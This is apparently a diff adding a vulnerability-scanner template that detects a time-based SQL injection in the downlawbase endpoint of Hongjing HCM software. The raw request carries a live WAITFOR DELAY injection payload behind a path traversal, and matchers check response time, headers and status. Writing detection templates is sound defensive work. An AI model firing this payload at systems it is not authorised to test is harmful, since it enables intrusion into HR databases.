@@ -1,0 +1,30 @@
+id: hjsoft-hcm-downlawbase-sqli
+
+info:
+  name: Hongjing HCM downlawbase - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    Hongjing HCM downlawbase is affected by SQL injection.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%AE%8F%E6%99%AFOA/%E5%AE%8F%E6%99%AFHCM-downlawbase%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: HJSoft-HCM
+
+http:
+  - raw:
+      - |
+        GET /templates/attestation/../../selfservice/lawbase/downlawbase?id=1';WAITFOR+DELAY+'0:0:5'--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+      - type: word
+        part: header
+        words:
+          - 'JSESSION='
+      - type: status
+        status:
+          - 200
